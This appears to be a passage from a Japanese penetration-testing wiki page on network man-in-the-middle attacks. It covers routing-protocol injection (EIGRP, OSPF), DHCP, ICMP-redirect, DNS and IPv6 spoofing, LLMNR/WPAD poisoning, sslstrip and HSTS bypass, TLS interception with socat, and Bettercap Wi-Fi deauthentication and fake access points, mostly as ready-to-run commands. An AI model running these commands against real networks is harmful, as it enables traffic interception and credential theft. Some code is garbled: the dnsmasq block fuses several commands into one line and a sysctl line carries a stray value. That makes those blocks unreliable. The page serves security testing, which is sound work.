**EIGRP (Enhanced Interior Gateway Routing Protocol)** は動的ルーティングプロトコルで、距離ベクトルプロトコルです。認証や passive interfaces の設定がなければ、侵入者は EIGRP のルーティングに干渉してルーティングテーブルの汚染を引き起こす可能性があります。さらに、EIGRP ネットワーク（つまり autonomous system）はフラットで、ゾーンによる分割がありません。攻撃者がルートを注入すると、そのルートは EIGRP の自律システム全体に拡散する可能性が高いです。

EIGRP システムを攻撃するには、正規の EIGRP router と隣接関係を確立する必要があり、これにより基本的な偵察から様々な注入攻撃まで多くの可能性が開かれます。

[**FRRouting**](https://frrouting.org/) は BGP、OSPF、EIGRP、RIP 等をサポートする仮想ルータを実装できます。攻撃者のシステムにデプロイするだけで、ルーティングドメイン内で正規のルータを装うことが可能になります。


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) は EIGRP (Enhanced Interior Gateway Routing Protocol) ブロードキャストを傍受する機能を持ち、パケットの注入も可能で、ルーティング設定の変更に利用できます。

### OSPF

Open Shortest Path First (OSPF) プロトコルでは、MD5 認証がルータ間の安全な通信を確保するために一般的に使用されます。しかし、この対策は Loki や John the Ripper のようなツールを使って破られる可能性があります。これらのツールは MD5 ハッシュをキャプチャしてクラッキングし、認証キーを暴露できます。そのキーを入手すれば、新しいルーティング情報の導入に使用できます。ルートパラメータの設定と侵害されたキーの設定には、それぞれ _Injection_ タブと _Connection_ タブが使用されます。

- **MD5 ハッシュのキャプチャとクラッキング:** Loki や John the Ripper などのツールが使用されます。
- **ルートパラメータの設定:** これは _Injection_ タブで行われます。
- **侵害されたキーの設定:** キーは _Connection_ タブで設定します。

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): ネットワークトラフィックをスキャンして脆弱性を見つけるツール
- ネットワーク攻撃に関する**より詳しい情報**は[**here**](https://github.com/Sab0tag3d/MITM-cheatsheet)で見つけられます。

## **Spoofing**

攻撃者は偽の DHCP レスポンスを送信して、ネットワークの新しいメンバーのすべてのネットワークパラメータ（GW、IP、DNS）を設定します。
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

前のセクションを参照してください: [previous section](#arp-spoofing).

### ICMPRedirect

ICMP Redirectは、ICMP packet type 1 code 5 を送信して、attackerがそのIPへ到達する最良の経路であることを示します。次に、victimがそのIPに接続しようとすると、packetはattacker経由で送られます。
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

攻撃者は被害者が要求するドメインの一部（またはすべて）を解決します。
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**dnsmasqで独自のDNSを設定する**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### ローカルゲートウェイ

システムやネットワークへの複数の経路が存在することがよくあります。ローカルネットワーク内のMACアドレスの一覧を作成したら、_gateway-finder.py_を使用してIPv4転送をサポートするホストを特定してください。
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

DNSルックアップが失敗した場合のローカルホスト解決には、Microsoftシステムは**Link-Local Multicast Name Resolution (LLMNR)** と **NetBIOS Name Service (NBT-NS)** に依存します。同様に、**Apple Bonjour** や **Linux zero-configuration** 実装は、ネットワーク内のシステムを発見するために **Multicast DNS (mDNS)** を利用します。これらのプロトコルは認証されておらず、UDP上でブロードキャスト/マルチキャストによって動作するため、攻撃者がユーザーを悪意あるサービスへリダイレクトする目的で悪用される可能性があります。

Responderを使用して、ホストが検索するサービスになりすまし、偽の応答を送信できます。\
Read here more information about [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

ブラウザは一般的に、**Web Proxy Auto-Discovery (WPAD) protocol to automatically acquire proxy settings** を利用します。これはサーバーから設定情報を取得することで、具体的には "http://wpad.example.org/wpad.dat" のようなURLから取得します。クライアントがこのサーバーを発見する方法はいくつかあります：

- Through **DHCP**, where the discovery is facilitated by utilizing a special code 252 entry.
- By **DNS**, which involves searching for a hostname labeled _wpad_ within the local domain.
- Via **Microsoft LLMNR and NBT-NS**, which are fallback mechanisms used in cases where DNS lookups do not succeed.

ツール Responder はこのプロトコルを悪用し、**malicious WPAD server** として振る舞います。DHCP、DNS、LLMNR、NBT-NS を用いてクライアントを誤誘導し、自身に接続させます。Responderを使ったサービスのなりすまし方法の詳細は[check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)。

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

ネットワーク上で様々なサービスを提供して、**ユーザーをだます** ことで **平文の認証情報** を入力させようとすることができます。**この攻撃の詳細は** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

この攻撃はIPv6環境におけるARP Spoofingと非常によく似ています。被害者に、GWのIPv6アドレスが攻撃者のMACアドレスに紐づいていると誤認させることができます。
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

一部のOSは、ネットワーク上で送信されるRAパケットからデフォルトでゲートウェイを設定します。攻撃者をIPv6ルータとして宣言するには、次を使用できます:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

デフォルトでは、一部のOSはネットワーク上のDHCPv6パケットを読み取ってDNSを設定しようとします。  
そのため、攻撃者はDHCPv6パケットを送信して自分をDNSとして設定することができます。  
DHCPは被害者にIPv6アドレスも割り当てます。
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (フェイクページとJSコード注入)

## インターネット攻撃

### sslStrip

基本的にこの攻撃は、**user**が**access**し、**HTTP**ページが**redirecting**して**HTTPS**版に移行する場合に発生します。**sslStrip**は**maintain** a **HTTP connection with** the **client and** a **HTTPS connection with** the **server** を行うため、接続を**plain text**で**sniff**できるようになります。
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
詳細は [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ と dns2proxy を使った HSTS バイパス

**sslStrip+ and dns2proxy** が **sslStrip** と異なる点は、例えば _**www.facebook.com**_ を _**wwww.facebook.com**_ に **リダイレクト**（**余分な**"**w**" に注意）し、そのドメインのアドレスを攻撃者のIPに設定することです。これにより、**クライアント**は _**wwww.facebook.com**_（攻撃者）に**接続**しますが、裏側では **sslStrip+** が **www.facebook.com** への HTTPS の実際の接続を**維持**します。

この手法の**目的**は HSTS を**回避する**ことです。なぜなら _**wwww.facebook.com**_ はブラウザの**キャッシュ**に保存されないため、ブラウザは騙されて **HTTPでのfacebook認証** を行ってしまうからです。\
この攻撃を行うには、被害者が最初に [http://www.faceook.com](http://www.faceook.com) にアクセスしようとする必要があり、https ではないことが重要です。これは http ページ内のリンクを変更することで行えます。

More info [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip や sslStrip+ はもはや機能しません。これはブラウザに事前保存された HSTS ルールが存在するためで、たとえユーザが「重要な」ドメインに初めてアクセスする場合でも HTTPS 経由でアクセスするからです。また、事前保存されたルールやその他生成されるルールはフラグ** [**`includeSubdomains`**](https://hstspreload.appspot.com) **を使用することがあり、したがって先ほどの** _**wwww.facebook.com**_ **の例は、** _**facebook.com**_ **が `includeSubdomains` を使って HSTS を採用しているため、もはや通用しません。**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP ポートでの待ち受け
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL ポートで待ち受け

#### 鍵と自己署名証明書の生成
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### 証明書を使用して待ち受ける
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### 証明書を使用してリッスンし、ホストへリダイレクトする
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
場合によっては、client が CA を有効かどうか確認する場合、**serve a certificate of other hostname signed by a CA** を返すことができます。\
別の興味深いテストは、要求された hostname の c**ertificate of the requested hostname but self-signed** を返すことです。

他に試すべきこととしては、certificate を valid certificate で署名しようとする（ただしその証明書自体は有効な CA ではない）ことや、valid public key を使い diffie hellman のようなアルゴリズムを強制する（実際の private key で何も decrypt する必要がないもの）ことがあります。そして client が real private key の probe（例えば hash）を要求してきたときに、偽の probe を送って client がこれをチェックしないことを期待します。

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### アクティブ検出ノート

UDP パケットが、要求されたポートを持たないデバイスに送信されると、ICMP (Port Unreachable) が返されることに留意してください。

### **ARP discover**

ARP パケットは、ネットワーク内で使用されている IP を検出するために使用されます。PC は各可能な IP アドレスに対してリクエストを送信する必要があり、実際に使用されているものだけが応答します。

### **mDNS (multicast DNS)**

Bettercap は MDNS リクエスト（各 X ms ごと）を送信して **\_services\_.dns-sd.\_udp.local** を問い合わせます。このパケットを受け取ったマシンは通常このリクエストに応答します。次に、"services" に応答するマシンのみを検索します。

**ツール**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap はポート 137/UDP に対して "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA" という名前を問い合わせるブロードキャストパケットを送信します。

### **SSDP (Simple Service Discovery Protocol)**

Bettercap はあらゆる種類のサービスを検索するために SSDP パケットをブロードキャストします (UDP Port 1900)。

### **WSD (Web Service Discovery)**

Bettercap はサービスを検索するために WSD パケットをブロードキャストします (UDP Port 3702)。

### Telecom / Mobile-Core (GTP) Exploitation


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## 参考資料

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
